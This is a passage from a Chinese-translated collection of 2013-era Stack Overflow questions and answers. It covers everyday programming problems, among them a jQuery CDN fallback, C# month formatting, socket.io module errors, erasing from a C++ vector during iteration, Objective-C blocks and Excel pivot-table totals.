> 时间：2020-10-12T05:30:39.793

```
const iframe = document.querySelector('iframe');
  const player = new Player(iframe);

  player.loadVideo(123456).then(() => {
    player.ready().then(() => {
      player.on('pause', (data) => console.log(data));
    }).catch((err) => console.log(err));
  }) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-11-20T22:29:54.790

```
 var onPlay = function(data) {
              console.log("play")
            };

            var onPause = function(data) {
              console.log("pause")
            };

            player.addEvent('play', onPlay);
            player.addEvent('pause', onPause); 
```

# javascript - 如果 Jquery 加载失败，则加载

> ID：15973699
> 
> 赞同：1
> 
> 时间：2013-04-12T14:16:24.913
> 
> 标签：javascript, jquery

我正在尝试将 jquery 加载到可能有也可能没有 jquery 的页面上。我只是使用 typeof 来确定它是否已加载。我的问题是我想在从 CDN 加载它后检查它是否已加载。这样，如果我的 CDN 失败，我可以回退到 Google 以确保代码仍然可以加载。到目前为止，我让它工作的唯一方法是我必须使用两个不同的 Javascript 文件。我没有得到任何控制台错误。所以为了测试我改变了我的 CDN 的 URL 使它不起作用，它加载了所有四行代码。它从来没有看到第一个条件被加载。如何在我的第一个条件语句之后检查 jQuery 是否成功加载？

```
if (typeof jQuery == 'undefined') {
    document.write("<script type=\"text\/javascript\" src=\"http:\/\/mysite\/scripts\/jquery-1.8.3.min.js\"><\/script>");
    document.write("<script type=\"text\/javascript\" src=\"http:\/\/mysite\/scripts\/jquery-ui-1.9.2.min.js\"><\/script>");
}
if (typeof jQuery == 'undefined') {
    document.write("<script type=\"text\/javascript\" src=\"http:\/\/ajax.googleapis.com\/ajax\/libs\/jquery\/1.8.3\/jquery.min.js\"><\/script>");
    document.write("<script type=\"text\/javascript\" src=\"http:\/\/ajax.googleapis.com\/ajax\/libs\/jqueryui\/1.9.2\/jquery-ui.min.js\"><\/script>");
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:25:37.457

您需要将脚本作为单独的`<script>`元素执行。如果页面上还没有 jQuery，第一个会从 CDN 添加 jQuery。该调用将在稍后调用之前`document.write`注入一个*新* 元素，因此如果 CDN 已启动，它将加载 jQuery。`<script>``window.jQuery || ...`

如果 CDN 宕机了，jQuery 仍然不会被定义，所以可以使用本地 fallback：

```
<script>
    //add jQuery if it doesn't exist on the page yet
    window.jQuery || document.write('<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"><\/script>');
</script>
<script>
    //add jQuery if the CDN happens to be down
    window.jQuery || document.write('<script src="/scripts/jquery-1.8.3.min.js"><\/script>');
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:19:11.567

可能是您正在寻找的，适应您的需求：

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script>
        window.jQuery || document.write('<script src="mylocalPath/jquery.js"><\/script>')
</script> 
```

# c# - 框架/页面的可见性

> ID：15973700
> 
> 赞同：0
> 
> 时间：2013-04-12T14:16:25.110
> 
> 标签：c#, wpf

这是问题所在：

我有一个带有框架的主窗口，我在其中通过按钮加载页面，我这样做是这样的：

```
private void btnKlanten_Click(object sender, RoutedEventArgs e)
{
    frameMain.Source = new Uri("Frames/Klanten.xaml", UriKind.Relative);
} 
```

在页面浏览中，我制作了一个自定义关闭按钮，所以当我点击它时，我模拟了要关闭的页面，我实际上所做的是将可见性设置为折叠：

```
private void Close_MouseDown(object sender, MouseButtonEventArgs e)
{
    this.Visibility = Visibility.Collapsed;
} 
```

现在的问题是我找不到任何方法让页面再次可见。我尝试在窗口上实例化页面并以这种方式访问​​可见性属性，但这不起作用。

奇怪的是，当我单击另一个在框架中加载另一个页面的按钮时，它确实有效。在我单击另一个按钮后，当我再次单击第一个按钮时，它也会再次显示。

有什么办法可以让这个工作吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:56:16.220

只需保留对页面的引用

```
private Page1 page1;
private void btnShowFrame(object sender, RoutedEventArgs e)
{
    if (page1 == null)
    {
        page1 = new Page1();
        frame1.Navigate(page1);
    }
    if (page1.Visibility != System.Windows.Visibility.Visible) page1.Visibility = System.Windows.Visibility.Visible;
} 
```

# ios - Facebook SDK iOS 错误

> ID：15973703
> 
> 赞同：2
> 
> 时间：2013-04-12T14:16:34.307
> 
> 标签：ios, facebook, sdk, facebook-apps

在尝试集成 Facebook iOS SDK 时，我遇到了这个错误：

> 由于未捕获的异常“com.facebook.sdk:InvalidOperationException”而终止应用程序，原因：“FBSession：未提供 AppID；要么将 AppID 传递给 init，要么将具有名为 FacebookAppID 的适当 ID 的字符串值键添加到包 *.plist'`

但是，我确实将`FacebookAppID`特定于 FB 的 URL 方案放入`Info.plist`：

```
<plist version="1.0">
<dict>
<key>CFBundleURLTypes</key>
<array>
    <dict>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>fb35903424086XXXX</string>
        </array>
    </dict>
</array>
<key>FacebookAppID</key>
<string>35903424086XXXX</string> 
```

任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-12T14:36:42.770

由于 Facebook 应用程序 ID 通常都是数字，我猜您将`Info.plist`条目设置为`FacebookAppID`数字类型而不是字符串类型。将行更改为 a`String`并且应该修复它。如果您已经拥有它`String`，请发布完整的`Info.plist`，我会看看它。

以下是具有有效集成的应用程序的相关条目：

```
<key>CFBundleURLTypes</key>
<array>
    <dict>
        <key>CFBundleURLName</key>
        <string></string>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>fb1655585934xxxxx</string>
        </array>
    </dict>
</array>
<key>FacebookAppID</key>
<string>1655585934xxxxx</string> 
```

看起来唯一的区别是`CFBundleURLName`，您可以尝试添加吗？

# windows - 在“while”循环中包装代码时出错

> ID：15973706
> 
> 赞同：0
> 
> 时间：2013-04-12T14:16:42.387
> 
> 标签：windows, powershell

好吧，我有点尴尬，但我还是要问一下。我有一个完美运行的脚本，我将它包裹在一个无限循环中，最后进入睡眠状态：

```
 while($true){} 
```

这就是我添加的所有代码，并且所有花括号都匹配，所以为什么会出现此错误：

“第 x 行缺少结束语句块，其中 x 是文件中的最后一行”

```
function A(){

}

while($true){

  [... Do Stuff ...]
  Start-Sleep -s 10
} 
```

我在 while{} 中删除了封装，一切都很好。

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:23:17.690

好吧，发布的语法是正确的。

我的猜测是你在浏览器中重新输入了这个，我会检查你所有的 ( ) 以确保你没有错误地输入 { }。

否则，需要复制并粘贴您的实际代码。

# magento - Magento 免费送货按总计计算

> ID：15973707
> 
> 赞同：4
> 
> 时间：2013-04-12T14:16:46.547
> 
> 标签：magento, magento-1.7, shipping

使用标准的 magento 运费表费率或 webshopapps 矩阵费率，我发现免费送货是根据不含税的小计而不是总计（小计 + 税）计算的。当然，我想在总计功能中设置免费送货。我发现它是可能的黑客核心代码：

app/code/core/Mage/Shipping/Model/Carrier/Freeshipping.php

更改第 60 行：

`|| ($request->getPackageValueWithDiscount() >= $this->getConfigData(’free_shipping_subtotal’))`

至

`|| ($request->getBaseSubtotalInclTax() >= $this->getConfigData(’free_shipping_subtotal’))`

这真的是唯一的方法吗？自然，如果是这样，我会创建此类的“副本”来覆盖此方法，从而将其从未来的核心更改中保存。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-17T14:48:01.227

我在促销 > 购物车价格规则中设置了免费送货，它适用于我。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-01-04T19:27:20.783

更改了第 60 行：上一篇文章中的 FROM 而不是 TO

```
|| ($request->getPackageValueWithDiscount() >= $this->getConfigData(’free_shipping_subtotal’)) 
```

（从）

```
|| ($request->getBaseSubtotalInclTax() >= $this->getConfigData(’free_shipping_subtotal’)) 
```

这真的是唯一的方法吗？自然，如果是这样，我会创建此类的“副本”来覆盖此方法，从而将其从未来的核心更改中保存。

# javascript - 通过 Web 套接字拖放外部图像？

> ID：15973710
> 
> 赞同：0
> 
> 时间：2013-04-12T14:16:52.597
> 
> 标签：javascript, html, websocket

我正在开发一个聊天应用程序，目前处于测试阶段 (mypin.im)，希望您能帮助我。我的应用程序使用 websockets（框架：eninge.io）工作，我想知道如何使用 HTML5 Drag and Drop API 从外部拖动图像。我已经研究并分配了示例不适用于外部图像（从 PC 拖动到 DIV）。我想要的一个很好的例子是 imgur 拖放。
所以我的问题是如何拖放外部图像并通过 WS 发送。我会将图像镜像到画布并将 base64 镜像到另一个客户端吗？
谢谢 ：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:42:43.920

我在这里找到了答案（[HTML5 在窗口之间拖放](https://stackoverflow.com/questions/3694631/html5-drag-and-drop-between-windows)），现在我只需要与 websockets 集成，我可以使用这个[http://blog.marcon.me/post/31143865164/send-images-through-websockets](http://blog.marcon.me/post/31143865164/send-images-through-websockets)来完成！

# c# - 删除前导零形式的月份 C#

> ID：15973716
> 
> 赞同：7
> 
> 时间：2013-04-12T14:17:18.457
> 
> 标签：c#, datetime

我无法从我在微软网站上找到的日期中删除前导零。

```
DateTime date1 = new DateTime(2008, 8, 18);
Console.WriteLine(date1.ToString("(M) MMM, MMMM", 
                  CultureInfo.CreateSpecificCulture("en-US")));
// Displays (8) Aug, August 
```

在这里完全行不通。

这是我的代码：

```
string date = '2013-04-01'
DateTime billrunDate = Convert.ToDateTime(date);
string test = billrunDate.ToString("M"); 
```

现在是测试`01 April`

我只需要它`4`在一个字符串或 int idc 谢谢！

如果我这样做，请编辑：

```
billrunDate.ToString("(M)"); 
```

我明白了`(4)`，但我不需要`()`

编辑2：这行得通

```
string test = billrunDate.ToString(" M ");
string testTwo = test.Trim(); 
```

非常非常丑

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-04-12T14:19:08.947

它被解释为“月日模式”`M`的[标准日期和时间格式。](http://msdn.microsoft.com/en-us/library/az4se3k1.aspx)

要将单个字符模式解释为[自定义日期和时间模式](http://msdn.microsoft.com/en-us/library/8kb3ddd4.aspx)，只需为其添加前缀`%`：

```
string test = billrunDate.ToString("%M"); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-12T14:20:24.093

我最常引用的 MSDN 页面之一是[自定义日期和时间格式字符串](http://msdn.microsoft.com/en-us/library/8kb3ddd4.aspx)页面。您可以将它们用作传递给 ToString() 方法的格式的一部分。如果它们中的任何一个是标准格式模式（如“M”）并且您想一起使用它们，则必须在它们前面加上 '%' 或在格式字符串中在它们之前或之后有一个空格（所以使用 "%M ”、“M”或“M”而不是“M”）。

相关部分：

**“米”**

月份，从 1 到 12。

**“毫米”**

月份，从 01 到 12。

**“嗯”**

月份的缩写名称。

**“嗯嗯”**

月份的全名。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-12T14:20:48.060

您无需将日期转换为字符串即可检索月份编号。
只需阅读DateTime 类的[Month属性：](http://msdn.microsoft.com/en-gb/library/system.datetime.month.aspx)

```
string date = "2013-04-01";
DateTime billrunDate = Convert.ToDateTime(date);
string test = billrunDate.Month.ToString(); 
```

# node.js - 错误：找不到模块“zeparser”

> ID：15973718
> 
> 赞同：1
> 
> 时间：2013-04-12T14:17:24.107
> 
> 标签：node.js, socket.io, npm

我已成功安装 node.js。我已经创建了文件

```
var http = require('http');
var url=require('url');
var fs=require('fs');
var io = require('socket.io');

http.createServer(function (req, res) {

fs.readFile('/var/www/nodeJS/client.html' ,
function ( err, data ) {
 if ( err ) {
  console.log( err );
  res.writeHead(500);
  return res.end( 'Error loading client.html' );
 }
 res.writeHead( 200 );
 res.end( data );
});

}).listen(8124, '127.0.0.1');

io.listen(http);

io.sockets.on('connection', function (socket) {
  socket.emit('news', { hello: 'world' });
  socket.on('my other event', function (data) {
  console.log(data);
});
}); 
```

每当我使用 io 对象时都会发生错误。没有 io 它工作正常。

```
Error: Cannot find module 'zeparser'
    at Function.Module._resolveFilename (module.js:338:15)
    at Function.Module._load (module.js:280:25)
    at Module.require (module.js:364:17)
    at require (module.js:380:17)
    at Object.<anonymous> (/var/www/nodeJS/node_modules/socket.io/node_modules/socket.io-client/node_modules/active-x-obfuscator/index.js:1:78)
    at Module._compile (module.js:456:26)
    at Object.Module._extensions..js (module.js:474:10)
    at Module.load (module.js:356:32)
    at Function.Module._load (module.js:312:12)
    at Module.require (module.js:364:17) 
```

在此之后，我还单独安装了模块 zeparser。我的默认 npm 安装目录似乎是 /usr/local/lib/node_modules。

我已将 NODE_PATH 设置为

```
export NODE_PATH="/usr/local/lib/node_modules" 
```

但得到同样的错误。

然后我尝试将 zeparser 模块复制到 /var/www/nodeJS/node_modules。然后错误变为

```
/var/www/nodeJS/node_modules/socket.io/lib/manager.js:104
  server.on('error', function(err) {
         ^
TypeError: Object #<Object> has no method 'on'
    at new Manager (/var/www/nodeJS/node_modules/socket.io/lib/manager.js:104:10)
    at Object.exports.listen (/var/www/nodeJS/node_modules/socket.io/lib/socket.io.js:78:10)
    at Object.<anonymous> (/var/www/nodeJS/app.js:35:4)
    at Module._compile (module.js:456:26)
    at Object.Module._extensions..js (module.js:474:10)
    at Module.load (module.js:356:32)
    at Function.Module._load (module.js:312:12)
    at Function.Module.runMain (module.js:497:10)
    at startup (node.js:119:16)
    at node.js:903:3 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-06-02T17:39:48.223

在您的根项目上，执行以下操作：

```
$ sudo npm install zeparser 
```

它为我解决了这个问题。

# objective-c - 应该有什么输出？

> ID：15973719
> 
> 赞同：0
> 
> 时间：2013-04-12T14:17:25.700
> 
> 标签：objective-c, automatic-ref-counting, weak-references

输出应该是

```
strString = değiştim
wkString  = NULL 
```

但事实并非如此。为什么？

```
#import <Foundation/Foundation.h>

@interface learnARC : NSObject {
    NSString *strString, __weak *wkString;
}

@property (strong) NSString *strString;
@property (weak) NSString *wkString;

-(void) yaz;

@end

#import "learnARC.h"

@implementation learnARC

@synthesize wkString, strString;

-(void) yaz {
    NSString *anaString = @"anaString";
    strString = anaString;
    wkString = anaString;
    NSLog(@"\nstrString = %@\nwkString  = %@",strString,wkString);

    anaString = @"değiştim";
    NSLog(@"\nstrString = %@\nwkString  = %@",strString,wkString);
}

@end

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        learnARC *lrnarc = [[learnARC alloc]init];
        [lrnarc yaz];
    }
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:23:26.290

> 为什么？

~~因为你在强调你的问题而不是你的班级名称......~~

说真的，弱引用不**应该**是`NULL`. 您已经为它分配了一个指针（一个指向字符串的指针`@"anaString"`）。而且由于字符串文字具有静态存储持续时间，因此它们在程序的生命周期内永远不会被释放。（我认为您可能将变量与属性混淆了？）

# ios - 将块存储在实例变量中有什么用

> ID：15973722
> 
> 赞同：1
> 
> 时间：2013-04-12T14:17:32.583
> 
> 标签：ios, objective-c, cocoa-touch, objective-c-blocks

我知道块是 ios 中添加的最新功能之一。但我真的找到了一个

艰难的学习吧。

我见过人们在做以下事情

```
typedef void(^CallBackBlk) (NSString *);

@property(copy,nonatomic)CallBackBlk block; 
```

在 .m 类中

```
-(void)doSomething:(CallBackBlk )cb{

       self.block=cb;

} 
```

我从来不明白在这里将它分配给 cb 有什么用。我不能简单地执行以下操作

```
-(void)doSomthing{

   block(@"my string");

} 
```

我真的没有得到将块存储在实例变量中的目的。有什么帮助吗

我举个例子。任何帮助是极大的赞赏

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-12T14:19:20.833

在你的`doSomething`方法中，`block`从哪里来？

回答这个问题，你就会有你的理由。

* * *

啊——评论把问题说清楚了。Snark 是有目的的（snark 并且懒得在早上 7 点在我的 iPhone 上输入真正的答案 :)。

实例变量只是放置东西的插槽。开始时该插槽中没有任何内容。

在您的情况下，您可以实现：

```
-(void)doSomething:(CallBackBlk )cb{
       cb();    
} 
```

但是，通常，当您*异步*执行某些操作时会使用回调。例如，您可能会这样做：

```
[myObject doSomething:^{
     NSLog(@"did something");
 }]; 
```

接着：

```
-(void)doSomething:(CallBackBlk)cb {
    dispatch_async(... global concurrent queue ..., ^{
         ... do some work ...
         cb();
    });
 } 
```

也就是说，`doSomething:`一旦`dispatch_async()`发生就会返回。回调块用于回调，让您知道异步操作已完成。

当然，仍然不需要实例变量。参加那个做一些更进一步的课程；使其成为某种相对复杂的状态转换引擎。比如说，就像您的普通互联网下载器或计算繁重的模拟引擎一样。到那时，将所有后台工作集中到一个方法中会过于复杂，因此，需要推动回调块（可能有多个；进度更新器、完成块和/或错误块，例如）到实例变量中允许类的实现更清晰地沿着功能线细分。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:21:12.720

如果您想*稍后*调用该块，您可以这样做，在分配它的方法已经返回之后。

例如，考虑一个管理下载的对象。您可能希望在下载完成时调用一个块（例如更新 UI），但您不希望下载方法必须等到这种情况发生（因为它可能需要很长时间）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-12T14:19:37.850

> 将块存储在实例变量中有什么用

也许以后可以访问它？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-12T15:42:55.603

要使用该块，请调用您的`doSomething:`方法：

```
CallBackBlk laterBlock = ^(NSString *someString) {
    NSLog(@"This code is called by SomeClass at some future time with the string %@", someString);
};

SomeClass *instance = [[SomeClass alloc] init];
[instance doSomething:laterBlock]; 
```

当您编写类的实现代码时，它可能会达到某种条件或完成一个动作，然后调用`laterBlock`：

```
if (someCondition == YES) {
    self.block("Condition is true");
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-12T14:24:17.793

也许和使用示例会有所帮助..

我发现将其存储为变量的一个用途是，如果您有多个视图都可以访问另一个视图（对我来说，这是下一个视图上的地图）我使用了由前一个视图设置的块（设置默认位置地图，初始化标记等）然后将其传递到下一个视图，它将运行它，设置地图。让块使用前一个视图的局部变量来访问某些属性很方便。这不是唯一的方法，但我发现这是一种很好的干净方式。

这是在 mapview 的 viewDidLoad 中运行的示例

```
if(setupMap){
    setupMap(mapView);
}

if(gpsUpdate){
    gpsUpdate(mapView);
}

if(addMarker){
    addMarker(mapView);
} 
```

现在，如果分配了这些块（if 语句检查它们是否为 nil），它将运行它们并为地图进行适当的设置。并非每个视图都需要执行这些操作，因此它们只会将需要完成的操作传递给地图视图。这使地图视图保持非常通用的目的，并且代码得到了很多重用。写一次用很多！

# cocos2d-iphone - 禁用对特定图层的触摸？

> ID：15973732
> 
> 赞同：0
> 
> 时间：2013-04-12T14:18:02.440
> 
> 标签：cocos2d-iphone

我有一个主要场景，其中添加了许多图层，例如：

```
[self addChild:layer1];
[self addChild:layer2]; 
```

..

`layer1/2`指向其他类中其他层的指针在哪里。

我需要在某些时候，仅从主场景或 layer2 本身禁用第 2 层的触摸。

我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:53:35.957

尝试：

```
layer2.isTouchEnabled = NO; 
```

从你的 layer2 类中（我猜你在这里扩展 CCLayer）：

```
self.isTouchEnabled = NO; 
```

# jms - Java EE 6 异步发送电子邮件 JMS 或异步注解

> ID：15973738
> 
> 赞同：1
> 
> 时间：2013-04-12T14:18:14.047
> 
> 标签：jms, java-ee-6

我想编写一个 Web 应用程序，我想在其中异步发送电子邮件。

我打算使用 JMS 队列来提出发送电子邮件的请求。消费者将选择消息并调用 API 来发送电子邮件。

另一种选择是使用@Asynchronous 注释来发送电子邮件。

哪个是更好的选择？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T04:54:52.077

SMTP 服务器将具有专门用于传递电子邮件的排队机制。除非您需要 JMS 的某些特定功能，否则我只会使用 @Asynchronous。否则，您正在重新发明轮子，并可能在流程中添加错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T04:54:30.310

除非并且直到您有一个特定的 bean 实现电子邮件逻辑，否则不要使用 JMS 队列来异步发送电子邮件。相反，使用 @Asynchronous 是一个不错的选择，或者在新线程中实现电子邮件逻辑。

有关更多详细信息，请参阅此帖子

[如何使用异步 API 在 Java 中发送电子邮件](https://stackoverflow.com/questions/5288098/how-to-send-email-in-java-using-asynchronous-api)

# c++ - 多集迭代器之间的距离

> ID：15973744
> 
> 赞同：2
> 
> 时间：2013-04-12T14:18:35.673
> 
> 标签：c++, stl, iterator, multiset

我们能找到复杂度小于 O(n) 的多重集中的两个迭代器之间的距离吗？
我尝试使用迭代器标头提供的 std::distance() 函数。但它的内部实现对于多集迭代器是 O(n)。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:27:36.640

`multiset::iterator`模型 BidirectionalIterator，而不是 RandomAccessIterator，所以`std::distance`只要求是线性的，而不是常数。

# excel - Excel 数据透视表不包括某些列总计

> ID：15973745
> 
> 赞同：3
> 
> 时间：2013-04-12T14:18:37.057
> 
> 标签：excel, pivot-table

我正在使用 Excel 2010 数据透视表来显示数据。我需要大多数列中的小计，但有些列显示百分比并且合计百分比不正确并显示令人困惑的值。有什么办法可以选择不总计的列。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T18:10:32.760

如果没有有关您的数据的更多详细信息，很难确保我准确地解决了您的问题，但我将提供一个简单的示例。

**推荐**

我建议您将所有度量/值放在数据透视表的值区域中，而不是在行标签中。这样，您将不会获得值的行小计。

为了解决百分比的非加法总计和小计，我建议您从数据透视表值中删除预先计算的百分比，而是使用在数据透视表本身中从基础数据计算的计算字段，并将提供正确的总计和小计。

**例子**

见下文：

![例子](https://i.stack.imgur.com/ko0TD.jpg)

**方法**

为了使用功能区创建计算字段，请选择您的数据透视表，然后转到数据透视表工具 --> 选项 --> 字段、项目和集合 --> 计算字段。然后，输入新字段的名称（在下面的示例中为 CalcPercentSoldUnits），以及该字段的公式定义（在下面的示例中为 =UnitsSold /UnitsProduced）。单击“添加”创建字段，然后单击“确定”退出对话框。

现在您已经创建了一个派生字段，而不是在您的基础数据表中，而是在您的数据透视表中，它可以像普通字段一样使用。您还可以看到，它将正确计算总计和小计，因为它不是添加常数，而是根据派生百分比的其他常数的总和进行计算。

在某些情况下，根据数据的结构方式，您可能需要创建计算项而不是计算字段。

我希望这会有所帮助 - 如果这不能解决您的情况，请发布您的数据和所需结果的其他示例。谢谢！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-09-20T05:49:30.933

无论您不想显示总列，只需将列隐藏在总部分中即可。我找不到任何其他方法来做到这一点。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-08-01T05:41:42.757

我也有同样的问题。有些列应该合计，有些则不应该合计。我唯一想到的是将所有列总计，然后在总计中格式化这些单元格，以便字体颜色与背景颜色匹配。这隐藏了那些选定的总计，不被查看和/或打印。我通过扩展数据透视表行进行了实验，选定单元格的格式跟随到新单元格中，当我删除一些行时，格式也随之而来。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-09-02T18:33:08.227

我想我有类似的情况和一个很好的演示目的的答案。我正在为未开票的项目向客户开票；我的数据透视表显示每个月的数量、费率和总错过收入 (qty*rate)。每个月都有数量和收入的总和是有意义的，但合计项目的费率却没有意义。数据透视表和价值选项是一个全有或全无的解决方案。相反，我只是选择了我需要隐藏的总数，并用白色字体颜色（蓝色为总计）格式化它们。使用这种创可贴方法，我的数据透视表现在看起来很棒。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-10-14T14:41:34.623

小心诸如不同/唯一计数之类的事情。此方法有助于百分比，但您不想求和或平均或以其他方式聚合唯一计数。我希望能够只排除单个字段的总数，但还没有找到这样做的方法。

# c# - 页面的 FlipView-Item 滑动导航 (c# & XAML)

> ID：15973746
> 
> 赞同：1
> 
> 时间：2013-04-12T14:18:39.770
> 
> 标签：c#, xaml, windows-store-apps

在我的项目中，我有几个页面使用 Manipulation-Started Delta 事件进行导航，检查我是否滑得足够远。如果我使用的是这种情况`this.Frame.Navigate(typeof(anotherPage);`，就像 FlipView 在项目中滑动一样。

它有点工作，但如果我在其中使用此函数的页面中有一个`ScrollViewer`其中包含其他处理程序的页面，我的函数将不再工作得那么好。

我想知道我的问题是否有解决方案？

是否有可能有一个 FlipView 并且项目已加载页面？

编辑*

```
private void grid_ManipulationStarted(object sender, ManipulationStartedRoutedEventArgs e)
    {
        initialPoint = e.Position;
    }

    private void grid_ManipulationDelta(object sender, ManipulationDeltaRoutedEventArgs e)
    {
        Point currentPoint = e.Position;
        if (currentPoint.X - initialPoint.X >= 100)
        {
            this.Frame.Navigate(typeof(DIStatePage), ts);

            e.Handled = true;
        }
        else if (currentPoint.X - initialPoint.X <= -100)
        {
            this.Frame.Navigate(typeof(PassagePage), ts);

            e.Handled = true;
        }
    } 
```

这就是我的导航功能的样子.. 我希望它更像是在 FlipView 内翻转

对于 ScrollViewer 问题，我可以设置 ScrollViewer ManipulationMode="All"，但是带有 ScrollViewer 的处理程序当然会停止工作。它与其他控件的工作方式相同..

# c++ - 擦除元素时 std::vector 可能不一致

> ID：15973750
> 
> 赞同：2
> 
> 时间：2013-04-12T14:18:46.880
> 
> 标签：c++, vector

在调试向量时，我发现不一致。假设以下代码试图从只有一个元素的向量中删除一个条目

```
#include <iostream>
#include <vector>
std::vector<int> v;
void myremove(int);
int main()
{
  v.push_back(10); 
  std::cout << "10 pushed back\n";
  myremove(10);
  std::cout << "done :)\n";
  return 0;
}

void myremove( int a )
{
  std::vector<int>::iterator it = v.begin();
  int counter = 0;
  for ( ; it != v.end(); it++ ) {
    std::cout << "iterating for " << counter << " times and vector size is " << v.size() << "\n";
    if ( a == (*it) ) {
      v.erase(it);
      std::cout << "removed " << a << "\n";
    }
    ++counter; 
  }
} 
```

这是我在输出中看到的：

```
 $ g++ test.cpp 
 $ ./a.out | more
 10 pushed back
 iterating for 0 times and vector size is 1
 removed 10
 iterating for 1 times and vector size is 0
 iterating for 2 times and vector size is 0
 iterating for 3 times and vector size is 0
 iterating for 4 times and vector size is 0
 iterating for 5 times and vector size is 0
 iterating for 6 times and vector size is 0
 ....
 ....
 iterating for 33790 times and vector size is 0
 Segmentation fault 
```

我的理解是，当元素被删除时，大小将变为 0，但是迭代器移动了一步，它仍然试图到达终点，但他不知道他已经通过了终点。

有人可以解释更多发生了什么以及如何避免这种情况吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-12T14:21:29.903

[`erase()`](http://en.cppreference.com/w/cpp/container/vector/erase)对迭代器的调用`it`无效后：

> 迭代器和对已擦除元素以及它们与容器末端之间的元素的引用无效。

设置`it`为的返回值，`erase()`并且仅在未发生删除时才增加：

```
while (it != v.end())
{
    if ( a == (*it) )
    {
        it = v.erase(it);
        std::cout << "removed " << a << "\n";
    }
    else
    {
        ++it;
    }
} 
```

其中的返回值为`erase()`：

> 最后一个被移除元素之后的迭代器。

您可以使用以下方法`std::remove_if()`代替手动编码循环来擦除元素：

```
v.erase(std::remove_if(v.begin(),
                       v.end(),
                       [](const int i) { return i == 10; }),
        v.end()); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-12T14:21:20.977

当你抹去

```
v.erase(it); 
```

您的迭代器不再有效。您必须使用从擦除返回的迭代器。Erase 为您提供了一个迭代器，该迭代器指向调用擦除的元素之后的元素。如果**在循环递增之前擦除了最后一个元素，则必须中断循环`it`**。

```
it = v.erase(it);
if(it == v.end())
    break; 
```

建议：您可以继续将 for 循环更改为 while 循环。并显式地增加迭代器（*即只有当你没有擦除任何东西时。如果你已经擦除了迭代器，那么迭代器就已经增加了*）。

像这样

```
while(it != v.end()) {
    if ( a == (*it) ) 
      it = v.erase(it);
    else
      ++it; 
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-12T14:21:19.730

每次插入和擦除都会使容器的所有迭代器失效。这些方法在插入/擦除后返回唯一有效的迭代器。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-12T14:21:40.457

在文档中`std::vector::erase`：

**迭代器有效性**

[指向位置（或第一个）及以后的迭代器、指针和引用无效，所有迭​​代器、指针和对位置（或第一个）之前元素的引用都保证继续引用它们在调用之前引用的相同元素。](http://cplusplus.com/reference/vector/vector/erase/)

您擦除循环中的元素（取决于迭代器）会使一切变得疯狂。差不多就是这样！

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-12T14:23:01.007

当你调用擦除函数时，迭代器不再是有效的迭代器，当你增加无效的迭代器时，你会得到虚假的结果。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-12T14:29:06.233

错误是您期望在对迭代器进行擦除之后，该迭代器仍将处于一致状态。情况并非如此，您的代码准确地说明了发生这种情况时的情况。

您的函数的语义是删除向量中等于 的所有元素`a`。您可以通过过滤向量来获得相同的结果。关于这一点，请参阅该问题：

[如何使用特定过滤器从其他向量制作 std::vector？](https://stackoverflow.com/questions/11028266/how-to-make-stdvector-from-other-vector-with-specific-filter)

# google-chrome - 如何从 chrome 扩展中获取已安装的应用程序快捷方式？

> ID：15973754
> 
> 赞同：1
> 
> 时间：2013-04-12T14:18:52.613
> 
> 标签：google-chrome, google-chrome-extension

我有一个扩展名用我写的那个替换了新的标签页。但是如果我安装的扩展程序有一个应用程序快捷方式（该快捷方式出现在默认的新标签页中），我自然无法访问此快捷方式。那么有什么方法可以从 api 中获取这些快捷方式吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T15:28:58.260

我找到了我要找的东西；[chrome.management.getAll](http://developer.chrome.com/extensions/management.html#method-getAll)。

# java - Jaxb 通配符编组编组

> ID：15973755
> 
> 赞同：1
> 
> 时间：2013-04-12T14:19:01.447
> 
> 标签：java, jaxb

首先对我糟糕的英语感到抱歉。我想解组而不是编组以下类。

```
@XmlSeeAlso({B1.class, C1.class})
public abstract class A1 implements Serializable {

private String parameterName;

  public A1 () {
  }

